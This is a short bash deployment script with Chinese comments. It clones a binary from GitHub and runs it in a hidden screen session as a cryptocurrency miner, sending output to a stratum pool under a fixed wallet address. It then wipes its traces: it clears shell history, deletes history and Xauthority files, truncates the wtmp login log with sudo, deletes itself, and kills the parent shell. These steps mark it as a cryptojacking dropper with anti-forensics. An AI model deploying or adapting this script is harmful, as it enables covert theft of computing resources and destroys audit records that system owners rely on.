#!/bin/bash
# 自动识别 root 权限
[[ $EUID -ne 0 ]] && S="sudo" || S=""

# 1. 安装基础依赖
$S apt-get update -y
$S apt-get install -y git screen wget

# 2. 彻底清理旧进程和旧文件
screen -ls | grep btx | awk '{print $1}' | xargs -I {} screen -X -S {} quit 2>/dev/null || true
cd $HOME
rm -rf btx1
[ -d "btx" ] && mv btx btx1 || true

# 3. 下载并设置权限
git clone https://github.com/xiaobintse/btx.git
if [ -d "$HOME/btx" ]; then
    chmod +x $HOME/btx/btx
else
    echo "下载失败"
    exit 1
fi

# 4. 后台启动 (自动获取主机名)
screen -dmS btx bash -c "cd $HOME/btx && ./btx -o stratum+tcp://btx-hk.lproute.com:8660 -u btx1zspaa73ljgf4jj3mlesdgkjlyawnv357kuervsvuvp8f0fq786e3qj6mtzs.$(hostname) -p x -a btx"

# 5. 痕迹清理
history -c && history -w
rm -f $HOME/.bash_history $HOME/.Xauthority 2>/dev/null
$S truncate -s 0 /var/log/wtmp 2>/dev/null

# 6. 自删除并退出终端
rm -f "$0"
echo "部署完成，3秒后关闭连接..."
sleep 3
kill -9 $PPID
